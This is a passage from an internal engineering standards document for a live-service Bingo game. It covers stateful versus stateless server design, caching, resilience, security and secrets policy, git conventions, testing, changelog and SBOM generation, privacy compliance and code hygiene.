- Horizontally scalable                 - Fast access to in-memory state
- Easy to replace/restart               - No external round-trips for state
- No session affinity needed            - Low latency for per-player ops
- Any instance handles any request      - Real-time coordination possible

DISADVANTAGES:                           DISADVANTAGES:
- Must fetch state on every request     - Hard to scale horizontally
- Higher latency (DB/Redis round-trip)  - Restart = state loss (unless persisted)
- External state store required         - Sticky routing required
- State store becomes a bottleneck      - More complex failover logic
```

### 15.3 In Our Bingo Game Context

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     Request Flow                                            │
│                                                                             │
│  Client ──→ ALB ──→ PHP API / Java API  (STATELESS)                         │
│              │         │                                                    │
│              │         └──→ Redis  (session state)                          │
│              │         └──→ MySQL  (legacy + service-owned game state)      │
│              │                                                              │
│  Client ──→ NLB ──→ SmartFox Server  (STATEFUL)                             │
│                         │                                                   │
│                         └── In-memory room state                            │
│                         └── Persists to DB on checkpoints                   │
└─────────────────────────────────────────────────────────────────────────────┘
```

The PHP API and Java microservices are **stateless by design:** they store no per-player state in memory. Any two instances are interchangeable, allowing the Auto Scaling Group (ASG) to add or remove them at will.

SmartFox is **stateful by necessity:** it holds the live state of every active Bingo room in memory for real-time coordination. This is why SmartFox cannot be horizontally scaled with a standard ASG, why a SmartFox restart requires active rooms to be evacuated or recovered, and why game outcomes must always be validated by the stateless API servers — not stored only in SmartFox memory.

### 15.4 When to Use Which

Use **stateless** for: API servers, background job workers, CDN, authentication services, and any service that reads from a database. These scale horizontally and are trivially fault-tolerant.

Use **stateful** (with care) for: real-time coordination (game rooms), streaming pipelines, and any scenario where the latency of fetching state from a remote store would degrade the real-time experience.

When using a stateful component, always ensure: state is periodically persisted to a durable store; the failure mode is defined and tested; reconnection/recovery logic exists on the client.

For detailed treatment of stateful and stateless server design in our architecture — including operational implications, deployment considerations, and how stateful and stateless components interact — see [ESTD4 §3. Server Architecture Principles](./ESTD4_-_Server_Engg_Standards.md#3-server-architecture-principles).

---

## 16. Caching: Concepts, Usage, and Tradeoffs

Caching is one of the most powerful performance tools available — and one of the most common sources of bugs in production. Understanding what a cache is, how it behaves, and when not to use it is as important as knowing how to use it.

### 16.1 What Is a Cache?

A cache is a fast, temporary store for data that is expensive to compute or fetch, but likely to be needed again soon. The cache stores a copy of the data so that subsequent requests can be served from the fast store instead of the slow original source.

```
WITHOUT CACHE:
  Request → Application → Database (50ms) → Response

WITH CACHE:
  Request → Application → Cache (0.5ms) → Response  ← cache HIT
  Request → Application → Cache MISS → Database (50ms) → Cache → Response ← first time
```

Caches exist at every layer of a computing system:

| Layer | Example | What Is Cached |
|:------|:--------|:---------------|
| Hardware (CPU) | L1/L2/L3 CPU cache | Memory pages, instructions | 
| OS | Page cache, file buffer | Disk read results |
| Client (Unity) | Asset cache (Addressables) | Downloaded textures, bundles | 
| Client (browser) | HTTP cache | API responses, static assets |
| Server (in-process) | Application dictionary/map | Frequently read config, feature flags | 
| Server (Redis) | Redis (AWS ElastiCache) |  Sessions, idempotency keys, leaderboards, distributed locks |
| Server (custom) | Internal caching server | Transient computed data, high-frequency lookups | 
| Cloud | CloudFront CDN | S3 assets delivered to players globally |  
| Database | MySQL buffer pool | Hot table data pages | 

**Our caching infrastructure:** We use two distributed server-side cache layers: **Redis** (AWS ElastiCache) as the primary cache and **a custom internal caching server** for transient high-frequency lookups. For server-side caching patterns, key naming, TTL, and serialization standards, see [ESTD4 §10. Anatomy of a Good Request Handler](./ESTD4_-_Server_Engg_Standards.md#10-anatomy-of-a-good-request-handler).

### 16.2 Advantages of Caching

- **Speed:** Serving from a cache is orders of magnitude faster than querying a database.  
- **Reduced load:** Fewer queries reach the database, allowing the same DB to handle more traffic.  
- **Cost:** Fewer DB operations means smaller RDS instance requirements.  
- **Resilience:** A cache can absorb traffic spikes that would otherwise overload the database.

### 16.3 Disadvantages and Risks

- **Staleness:** Cached data can become out of date. If a player's coin balance is cached for 5 minutes, they may see an old value for up to 5 minutes after an update.  
- **Complexity:** Cache invalidation — knowing when to remove or update a cached value — is notoriously difficult to get right.  
- **False safety:** A cache can mask a slow database. When the cache is cold (after a restart or a cache flush), all traffic hits the database simultaneously, which can be catastrophic.  
- **Memory pressure:** Caches compete for memory with the application. An unbounded cache will eventually exhaust available memory.

### 16.4 When to Use a Cache

Use a cache when:

- The data is read far more often than it is written (player profile, room list, feature flags).  
- The data is expensive to compute (leaderboard calculations).  
- Slight staleness is acceptable (the lobby room list can be 30 seconds old without harming the player experience).  
- The data is shared across many requests (weekly event configuration).

### 16.5 When NOT to Use a Cache

Do not cache:

- **Game outcomes and economic state** (coin balance after a purchase, win results). These must always be database-authoritative. 
- **Real-time state** (number of players currently in a room). This changes too frequently to cache usefully.  
- **Security-sensitive data** (raw auth tokens, payment details).  
- **Idempotency keys** in volatile cache — these require durable storage.

### 16.6 Cache Invalidation and Implementation Patterns

When the underlying data changes, the cache must be invalidated. The standard pattern for this project is cache-aside with write-through invalidation. For detailed implementation patterns including cache-aside code examples, cache stampede prevention, and server-side caching strategy, see [ESTD4 §10. Anatomy of a Good Request Handler](./ESTD4_-_Server_Engg_Standards.md#10-anatomy-of-a-good-request-handler).

---

## 17. Resilience and Fail-Safe Design

### 17.1 Retry with Exponential Backoff

When retrying failed operations, use exponential backoff with jitter. Only retry operations that are idempotent (safe to call multiple times).

```
Initial delay: 100ms
Backoff multiplier: 2×
Jitter: ±20%
Max retries: 3
Max delay cap: 5 seconds
```

### 17.2 Circuit Breakers

When calling external dependencies, implement a circuit breaker to prevent cascading failures:

```
States: Closed (normal) → Open (failing, reject calls) → Half-Open (test with one call)

Open after: 5 consecutive failures or 50% failure rate over 10 seconds
Half-open after: 30 seconds
Close after: first successful call in Half-Open state
```

### 17.3 Graceful Degradation

Design systems so that secondary features degrade before core gameplay does. Leaderboard unavailable? Show a "temporarily unavailable" message. Do not prevent room joins. Asset CDN unavailable? Show placeholder art. Do not prevent gameplay.

For detailed server-side resilience implementation — including retry configuration, circuit breaker thresholds, graceful degradation patterns, and runbook requirements — see [ESTD4 §19. Disaster Recovery Readiness](./ESTD4_-_Server_Engg_Standards.md#19-disaster-recovery-readiness).

---

## 18. Security Baseline

### 18.1 Trust Nothing From the Client

Every request from a Unity client, Facebook, or web client must be validated and authorized server-side. Client-side validation is for UX only; server-side validation is for security. Never trust: player ID in the request body (derive from session token), coin counts sent from client, or win claims sent from client.

### 18.2 Authentication and Authorization

All API endpoints must require authentication unless explicitly public. Authorization must be checked server-side, every time, for every operation. Use short-lived tokens (default TTL: 1 hour access token, 30-day refresh token) with a sliding window refresh. Apply the principle of least privilege: a component or user account must have only the permissions required for its specific function.

### 18.3 Transport Security

All external communication must use TLS 1.2 or higher. TLS 1.0 and 1.1 must be disabled. Internal service-to-service communication must also be encrypted in transit where feasible. Certificate validity must be checked; certificate pinning should be implemented on Unity mobile clients.

### 18.4 Dependency Security

All third-party libraries must be kept up to date with security patches. Dependency versions must be pinned (not floating) to prevent unexpected version changes. A software composition analysis (SCA) scan must run as part of CI. Builds with known high/critical CVEs must be blocked.

### 18.5 Code Security

No hardcoded credentials, API keys, or connection strings in source code. SQL queries must always use parameterized statements or prepared statements. Deserialization of untrusted data must be avoided or performed with strict type whitelisting.

---

## 19. Secrets Management

All application secrets must be stored in AWS Secrets Manager. No new secrets may be added as environment variables or config files. Secrets must never appear in source code, log output, or version control.

Secrets must be rotated on a defined schedule and immediately upon suspected compromise. Access to secrets must follow the principle of least privilege: each service should have an IAM role with access only to the secrets it needs.

---

## 20. Security Vulnerability Awareness by Domain

In a live-service Bingo game, security failures do not only look like classic data breaches. They also show up as economy abuse, duplicate reward claims, fraudulent wins, unfair gameplay advantages, session compromise, privacy violations, and outages. Because our products span Unity clients, PHP and Java API services, SmartFox real-time servers, MySQL, AWS infrastructure, and CI/CD systems, every engineer is responsible for understanding the attack surface of the domain they work in.

This section is intentionally practical rather than exhaustive. It lists the vulnerability categories most relevant to our environment and the minimum controls expected to mitigate them. It should be read together with other standardized materials that discuss security.

### 20.1 Security Rules That Apply Everywhere

- **Never trust the client.** The client is presentation and input only. Economy, entitlements, room membership, win validation, and reward eligibility must remain server-authoritative.
- **Authentication is not authorization.** A valid token does not grant access to every resource, room, or function. Ownership and role checks must happen on every protected action.
- **Trusted for one claim does not mean trusted for all claims.** A session token may identify a player, but request payloads, route parameters, client timestamps, and client-computed rewards remain untrusted until checked against server authority.
- **Permission boundaries reduce blast radius.** Runtime services, tools, database users, CI jobs, and cloud roles must have only the access needed for their job and environment.
- **Security controls must tolerate retries, reconnection, and mixed client versions.** Duplicate requests, delayed SmartFox messages, and older client builds must not create bypasses.
- **Secrets must never appear in code, build artifacts, local storage, logs, IaC literals, or CI output.** Use approved secret stores and runtime injection patterns only.
- **External input includes more than player payloads.** Query params, SmartFox messages, internal admin tool input, remote content/config, webhook payloads, and inter-service traffic are all untrusted until validated.
- **Fail closed on uncertainty.** If validation, authorization, or integrity checks cannot complete confidently, deny or quarantine the action rather than guessing.

### 20.2 Domain-Specific Vulnerability Awareness

The following child standards contain detailed vulnerability tables specific to each domain. Every engineer must read the vulnerability table in the standard(s) relevant to their work.

| Domain | Document | Section |
|:-------|:---------|:--------|
| Client (Unity, Web, Facebook) | [ESTD2 §12.5 Client-Side Security Vulnerabilities (Unity iOS / Android / Web / Facebook)](./ESTD2_-_General_Client_Engg_Standards.md#125-client-side-security-vulnerabilities-unity-ios--android--web--facebook) | Client-Side Security Vulnerabilities |
| Server / API (PHP, Java) | [ESTD4 §17.5 Server/API Security Vulnerabilities](./ESTD4_-_Server_Engg_Standards.md#175-serverapi-security-vulnerabilities) | Server/API Security Vulnerabilities |
| SmartFox / Real-Time | [ESTD12 §13]] | SmartFox Security Vulnerabilities |
| Database | [ESTD9 §11.3 Database Security Vulnerabilities](./ESTD9_-_Database_Standards.md#113-database-security-vulnerabilities) | Database Security Vulnerabilities |
| Cloud / AWS Infrastructure | [ESTD5 §4.5 Cloud Security Vulnerabilities](./ESTD5_-_Cloud_Engg_Standards.md#45-cloud-security-vulnerabilities) | Cloud Security Vulnerabilities |
| Network / Transport | [ESTD5 §5.5 Network and Transport Vulnerabilities](./ESTD5_-_Cloud_Engg_Standards.md#55-network-and-transport-vulnerabilities) | Network and Transport Vulnerabilities |
| Infrastructure-as-Code (IaC) | [ESTD5 §2.7 IaC Security Vulnerabilities](./ESTD5_-_Cloud_Engg_Standards.md#27-iac-security-vulnerabilities) | IaC Security Vulnerabilities |
| CI/CD and Supply Chain | [ESTD5 §8.6 CI/CD and Supply Chain Vulnerabilities](./ESTD5_-_Cloud_Engg_Standards.md#86-cicd-and-supply-chain-vulnerabilities) | CI/CD and Supply Chain Vulnerabilities |

### 20.3 Security Review Cadence and Minimum Expectations

- **Every PR:** Reviewers check for injection risk, auth/authz gaps, unsafe SmartFox transitions, secret exposure, logging hygiene, schema or migration safety, and abuse opportunities in economy-sensitive flows.
- **Every release:** Run dependency and BOM scans, validate exposed endpoints and permissions, verify that critical auth, purchase, reward, and room-join flows still enforce the intended security controls.
- **Every live-ops content change or weekly reset:** Review operator tooling access, remote config changes, reward claim logic, event eligibility, and any changes that could create abuse or duplication paths.
- **Quarterly:** Review IAM permissions, security groups, secret age, WAF rules, SmartFox connection quotas, log redaction, backup access, and IaC drift.
- **Annually:** Perform an external penetration test or equivalent independent security assessment, plus a privacy/compliance review covering GDPR/CCPA obligations.
- **After every security incident or near miss:** Add regression tests, update runbooks, and update the relevant ESTD sections so the learning becomes part of the engineering standard.

---

## 21. Version Control and Git Standards

### 21.1 What Must Never Be Committed

- Secrets, credentials, API keys  
- Build artifacts, compiled binaries  
- Editor-specific settings files (unless agreed by the team)  
- Large binary assets that belong in a dedicated asset store  
- Commented-out code blocks unless accompanied by a TODO comment with a ticket reference

### 21.2 Commit Message Format

```
<type>(<scope>): <short summary>          ← Subject/Title (required)
<empty line>
<body — explains the WHY, not the WHAT>   ← Detailed explanation (optional)
<empty line>
<footer>                                  ← References, breaking changes (optional)  
```

**Type:** The **type** is a short prefix in the commit subject line that describes **what kind of change** the commit contains. It follows the [Conventional Commits](https://www.conventionalcommits.org/) specification and helps:

- **Automate changelogs**
- **Determine semantic version bumps**
- **Make git history scannable**

**Valid Type Tokens**

| Type | Purpose |
|:-----|:--------|
| `feat` | A new feature for the user |
| `fix` | A bug fix |
| `docs` | Documentation changes only |
| `style` | Code formatting, missing semicolons, etc. (no logic change) |
| `refactor` | Code restructure without adding features or fixing bugs |
| `perf` | Performance improvements |
| `test` | Adding or updating tests |
| `build` | Changes to build system or dependencies (e.g. npm, webpack) |
| `ci` | Changes to CI/CD configuration (e.g. GitHub Actions, Jenkins) |
| `chore` | Maintenance tasks, no production code change |
| `revert` | Reverts a previous commit |
| `hotfix` | Applies a hotfix |
| `db` | A database related change |
| `infra` | An infrastructure related update |

**Scope:** The subsystem, feature, or module affected. Use consistent, agreed-upon tokens. Examples: `lobby`, `reward-engine`, `bingo-card`, `auth`, `php-api`, `live-server`, `ci`.

**Short summary:** Imperative present tense ("add", "fix", "remove"). Maximum 72 characters. No trailing period.

**Footer:** The **footer** is the last section of a git commit message, separated from the body by a blank line. It is used to reference **issues, tickets, breaking changes, or co-authors.**

**Common Footer Tokens**

| Token | Purpose |
|:------|:--------|
| `Fixes #123` | Closes a GitHub/GitLab issue |
| `Closes #123` | Same as Fixes |
| `Refs #123` | References an issue without closing it |
| `BREAKING CHANGE:` | Flags a breaking API change |
| `Co-authored-by:` | Credits another contributor |
| `Reviewed-by:` | Credits a reviewer |

**Note:** Do not mix multiple commit types in one commit. If your changes involve more than one type, split them into separate commits, each for a single type.

**Examples:**

```
feat(reward-engine): add periodic jackpot bonus calculation

The jackpot pool is seeded by a percentage of ticket sales each cycle
and distributed to the winner at the end of the event. This replaces
the flat bonus previously configured in the CMS.

Refs: BINGO-4201
```

```
fix(live-server): prevent duplicate BINGO call on room reconnect

Under high-reconnection load, the SmartFox room extension could fire
the BINGO_WIN event twice for the same game. Added an idempotency
check keyed on (roomId, gameSequenceId) before dispatching the event.

Refs: BINGO-3987
Co-authored-by: @developer1
```

---

## 22. Branching Strategy (Gitflow)

```
development (protected — always deployable)
  │
  ├── release/2026-03          ← Monthly release branch
  │       └── fix/BNG-1234     ← Bug fixes against release
  │
  ├── feature/BNG-4201-jackpot-bonus
  ├── fix/BNG-3987-duplicate-bingo
  └── hotfix/BNG-5001-coin-award-null   ← Emergency production fix
```

**Rules:**

- Never commit directly to development.  
- Feature branches must be kept short-lived (max 5 business days before merging or rebasing).  
- Hotfixes on development must be back-ported to any active release branches.  
- Tag every production deployment: `v[YYYY].[MM].[patch]` (e.g., `v2026.03.1`).

---

## 23. Dependency (External library) Management

Before adding any external library:

1. Is this solving a problem that should be solved in-house given the specific game's needs?  
2. Is the library actively maintained (last commit within 6 months)?  
3. Does it have a permissive license compatible with commercial use?  
4. What is its security track record?  
5. What is the bundle/binary size impact (especially client-side)?

**New dependencies require architect approval.** Always pin to a specific version in production. Review and intentionally upgrade dependencies monthly; do not let them float.

For code-level dependency management and coupling standards (tight vs loose coupling, dependency injection, decoupling patterns), see [ESTD19](./ESTD19_-_Dependency_Management_and_Coupling_Standards.md).

---

## 24. Testing Requirements

### 24.1 Testing Pyramid

```
        ┌────────────────────────────────────┐
        │   Manual QA / Exploratory Testing  │
        ├────────────────────────────────────┤
        │   Integration & End-to-End Tests   │
        ├────────────────────────────────────┤
        │   Unit Tests  ← 70% of test effort │
        └────────────────────────────────────┘
```

### 24.2 Unit Testing Is Mandatory

Unit testing is not optional. The minimum coverage target for all new code is ***80% line coverage*** for business logic classes. There is no exception for time pressure: untested code in a live-service game is a debt that compounds into incidents.

Coverage is a floor, not a ceiling. 80% coverage of a class that tests only the happy path is inadequate. Tests must include: happy paths, boundary conditions, null/empty inputs, and failure paths.

**A thorough document on Paths, Unit testing, and Unit testing strategy is available at [ESTD16](./ESTD16_-_Paths_And_Unit_Testing_Strategy.md).**

### 24.3 What Must Be Unit Tested

- Win/loss detection logic  
- Bonus and reward calculation formulas  
- Content reset schedule calculations  
- State machine transitions  
- Any function with more than 2 conditional branches  
- Any function that touches coin balance, purchases, or rewards

### 24.4 Test Naming Convention

```
[MethodUnderTest]_[Scenario]_[ExpectedOutcome]

AwardWeeklyBonus_WhenAlreadyClaimedThisReset_ReturnsAlreadyClaimedError
CalculateWinPattern_WithFullHousePattern_ReturnsTrue
JoinRoom_WhenRoomIsFull_ReturnsRoomFullError
```

### 24.5 Build Promotion Policy

Builds must be promoted through environments in order. A build cannot skip an environment stage.

```
┌─────────────────────────────────────────────────────────────┐
│  Developer  →  Dev  →  QA  →  Staging  →  Production        │
│                                                             │
│  RULE: The exact same build artifact (same binary, same     │
│  image tag, same Unity build) that passes QA is the artifact│
│  that goes to Staging and then to Production.               │
│  We do NOT rebuild for each environment.                    │
└─────────────────────────────────────────────────────────────┘
```

Environment-specific configuration (database endpoints, API keys, feature flags) is injected at deploy time. The build itself is environment-agnostic.

**Promotion gates:**

- **Dev → QA**: Passes CI (lint, unit tests, build).  
- **QA → Staging**: Passes QA sign-off (functional testing, regression).  
- **Staging → Production**: Passes Staging validation (load test, stakeholder sign-off, architect approval).

---

## 25. Changelog Extraction for Production Builds

A changelog documents what changed between releases. In a live-service game with monthly releases, a clear changelog is essential for: post-deployment incident investigation ("what changed that might have caused this?"), player communication, platform submission compliance (App Store, Google Play require change descriptions), and audit history.

### 25.1 Changelog Format

Every production build must have a changelog entry. The changelog is maintained in `CHANGELOG.md` at the root of each repository, following the [Keep a Changelog](https://keepachangelog.com/) format:

```
## [v2026.03.1] - 2026-03-18

### Added
- Periodic jackpot bonus: Players now receive a jackpot bonus at the end
  of each event cycle (Refs: BINGO-4201)
- New room theme: "Spring Meadow" (Refs: BINGO-4150)

### Changed
- Increased default room player capacity from 200 to 250 (Refs: BINGO-4198)

### Fixed
- Fixed duplicate BINGO win event during room reconnection (Refs: BINGO-3987)
- Fixed coin balance not refreshing after weekly bonus claim (Refs: BINGO-4012)

### Security
- Updated session token TTL from 24 hours to 1 hour (Refs: BINGO-4000)
```

### 25.2 Automating Changelog Generation

The changelog should be generated semi-automatically from the git commit history. The commit message format defined in [§21.2](#212-commit-message-format) is specifically designed to make this possible:

```shell
# Generate changelog entries from commits since last tag
git log v2026.02.1..HEAD --oneline \
  --format="- %s (%.7H)" \
  | grep -E "^- (feat|fix|security|hotfix)" \
  | sed 's/^- feat/- Added/; s/^- fix/- Fixed/; s/^- hotfix/- Fixed/'
```

### 25.3 Platform-Specific Changelog

For app store submissions, maintain a concise player-facing changelog separate from the developer changelog. The developer changelog contains ticket references and technical detail. The player-facing changelog describes changes in plain language from the player's perspective.

### 25.4 Changelog in the Build Pipeline

The CI/CD pipeline must:

1. Validate that `CHANGELOG.md` has been updated for any production-bound release branch.  
2. Include the changelog entry in the release tag annotation.  
3. Archive the changelog alongside the build artifact in S3.

---

## 26. Generating a Bill of Materials (BOM) for a Project

**Definition:** A *Bill of Materials (BOM)*, in the software context, is a structured inventory of every third-party library, framework, SDK, and runtime dependency in a project — including transitive dependencies (dependencies of your dependencies). It is the authoritative answer to: "What does this software actually ship?"

A BOM enables security scanning (CVE detection), license compliance auditing, supply chain risk assessment, and incident response ("Is our product affected by Log4Shell?"). A BOM that is generated at build time from the actual dependency graph is called a *software BOM* (SBOM).

### 26.1 Why Every Project Needs a BOM

In our architecture we have multiple technology stacks (PHP, Java, C#/Unity, TypeScript/Next.js, Terraform) each with their own dependency ecosystems. A security vulnerability in one dependency (e.g., a PHP Composer package, a Maven artifact, or an npm package) may affect multiple projects. Without a machine-readable BOM, determining exposure across the entire estate takes hours; with a BOM, it takes seconds.

### 26.2 BOM Generation by Technology Stack

Each technology stack has its own tooling for BOM generation. Refer to the relevant child standard for stack-specific BOM generation instructions:

| Stack | Document | Section |
|:------|:---------|:--------|
| Java (Maven) | [ESTD7](./ESTD7_-_Java_Programming_Standards.md#estd7---java-programming-standards-for-bingo-microservices-and-smartfox-server) | BOM generation with CycloneDX Maven plugin |
| PHP (Composer) | [ESTD6](./ESTD6_-_PHP_Programming_Standards.md#estd6---php-programming-standards) | BOM generation with CycloneDX Composer plugin |
| TypeScript/Next.js (npm) | [ESTD11](./ESTD11_-_Web_Development_and_Deployment_Standards.md#estd11--web-tools-creation-and-deployment-standards) | BOM generation with cyclonedx-npm |
| Terraform (IaC) | [ESTD5](./ESTD5_-_Cloud_Engg_Standards.md#estd5---cloud-engineering-standards-and-best-practices-for-infrastructure-management) | Provider lockfile as IaC BOM |

For Unity/C# projects, use the CycloneDX .NET tool (`dotnet cyclonedx`) for NuGet dependencies. For Unity Package Manager (UPM) packages, the `Packages/packages-lock.json` file serves as a lockfile BOM and must be committed to version control.

### 26.3 BOM Validation and Security Scanning

Generating a BOM is only the first step. The BOM must be scanned against known vulnerability databases:

```shell
# Scan a CycloneDX BOM against the NVD CVE database
docker run --rm -v $(pwd):/data owasp/dependency-check \
  --scan /data/bom.json \
  --format HTML \
  --out /data/dependency-check-report

# Or use Trivy (preferred — faster, wider coverage)
trivy sbom bom.json
```

### 26.4 BOM in the CI/CD Pipeline

Every production build must generate and archive a BOM as a build artifact. The CI/CD pipeline must:

1. Generate the BOM after dependency resolution (pre-compile step).  
2. Run a CVE scan against the BOM using Trivy or OWASP Dependency-Check.  
3. Fail the build if any HIGH or CRITICAL severity CVE is found with no approved exception.  
4. Archive the BOM alongside the build artifact in S3 with the build version as the key.  
5. Publish BOM to a central SBOM registry (e.g., AWS Inspector or a Dependency-Track instance) for portfolio-level visibility.

The archived BOM and its scan report are the evidence required for security audit compliance.

### 26.5 BOM Governance Rules

- Every new dependency addition ([§23](#23-dependency-external-library-management)) triggers a re-scan of the BOM before the PR can be merged.  
- A CVE discovered after deployment requires an incident response within 48 hours for CRITICAL severity and 7 days for HIGH severity.  
- Dependency upgrades performed solely for CVE remediation are classified as `hotfix` commits and may bypass normal feature branch cadence with Architect approval.

---

## 27. Privacy Compliance (GDPR and CCPA)

- Do not store or log personal data beyond what is necessary.  
- Support player data deletion requests with a documented, auditable process.  
- Analytics events must not include identifiable personal data without explicit player consent.  
- Anonymize player data in non-production environments before use.

---

## 28. Code Hygiene

Code hygiene is the ongoing discipline of keeping a codebase clean, readable, and free of accumulated technical debt. In a 15-year-old live-service game with monthly releases and periodic content resets, hygiene is not a one-time cleanup — it is a continuous practice embedded into every sprint. An unhygienic codebase slows every engineer who touches it.

### 28.1 What Is Code Hygiene?

Code hygiene covers everything that affects the *long-term health* of a codebase that is not directly a feature or a bug fix:

| Category | What Good Hygiene Looks Like |
|:---------|:-----------------------------|
| **Dead code** | No unused classes, methods, variables, or import statements |
| **TODO/FIXME discipline** | Every TODO has a ticket number and an owner; none older than 2 sprints without re-triage |
| **Naming consistency** | Names in code match the domain glossary ([§4.1](#41-domain-glossary)) and language conventions |
| **Documentation freshness** | Doc-comments updated in the same commit as the code they describe |
| **Dependency currency** | No dependencies abandoned, unpatched for > 1 release cycle, or with known CVEs | 
| **Branch hygiene** | No stale feature branches older than 10 business days; merged or deleted |
| **Test coverage maintenance** | Coverage does not decrease release-over-release |
| **Configuration cleanup** | Feature flags older than 2 sprints past their expiry are removed |
| **Secret rotation** | All credentials rotated on schedule; no expired secrets in Secrets Manager |

### 28.2 Hygiene Checkpoints

Hygiene is enforced at three levels:

**Per-PR (every pull request):**

- No new dead code introduced  
- No TODO without a ticket  
- No commented-out code blocks (except HACK with a ticket)  
- Linter and formatter pass in CI

**Per-Sprint:**

- Review and triage all TODOs opened more than 2 sprints ago  
- Identify and raise tickets for any feature flags past their expiry  
- Review dependency update alerts; patch critical/high CVEs immediately

**Per-Release (monthly):**

- Dead code sweep: a dedicated task to remove unused code identified during the release cycle  
- Changelog review: ensure all changes are captured  
- Coverage check: confirm the 80% floor has not been breached  
- Runbook review: update any runbooks whose procedures have changed

### 28.3 The "Leave It Better" Rule

Every PR must leave the codebase in a better state than it found it. This does not require a full refactoring pass. A single improvement per PR compounds into a clean codebase over time: rename one unclear variable, remove one dead method, add one missing test, update one stale comment. Small, consistent hygiene is more valuable than infrequent large cleanups.

---

## 29. Common Pitfalls to Avoid

| # | Pitfall | Impact | Remedy |
|:--|:--------|:-------|:-------|
| 1 | Silent exception swallowing | Bug is hidden forever; live service degrades invisibly | Enforce logging in all catch blocks |
| 2 | Magic numbers and strings | Code is unreadable; changes ripple unpredictably | Named constants or config values only |
| 3 | God objects | Untestable, fragile, impossible to change safely | Single Responsibility Principle | 
| 4 | Copy-paste code | Bug fixes must be made in N places; divergence over time | Extract shared utilities; reject at review | 
| 5 | Timezone bugs | Incorrect content reset, bonus timing failures | Use UTC everywhere; store UTC; display locally | 
| 6 | Hardcoded content reset period | Content cadence changes break code | Read period from configuration | 
| 7 | Race conditions in bonus awards | Double-awarding currency; economic integrity failure | Idempotency keys + DB-level constraints | 
| 8 | Breaking existing API contracts | Old clients fail silently | Versioned APIs; backward compat testing | 
| 9 | Block try-catch in non-boundary code | Cannot determine which operation failed | One try-catch per failable operation in service/domain layers; typed multi-catch only at entry-point boundaries | 
| 10 | Over-caching economic state | Players see stale coin balance | Never cache coin balances; DB is truth |

---

## 30. Enforcement and Exceptions

All standards in this document are enforced at code review ([ESTD10](./ESTD10_-_PR_Authoring_And_Reviewing_Standards.md#estd10---pull-request-authoring-and-review-standards-for-engineers)). Code hygiene practices are tracked per sprint ([§28](#28-code-hygiene)). CI pipelines enforce a subset automatically: linting, static analysis, test coverage thresholds, and SCA scanning.

Exceptions to any rule require written approval from the Director of Engineering or a designated Architect. The approval must be recorded in the PR description, the relevant Confluence page, or the team's exception log. Exceptions are time-bound: they must have an expiry date and a remediation plan.

No exception may be approved for security-critical rules: parameterized queries ([ESTD4 §17. Security Standards](./ESTD4_-_Server_Engg_Standards.md#17-security-standards)), no hardcoded secrets ([§18.5](#185-code-security)), TLS requirements ([§18.3](#183-transport-security)).  
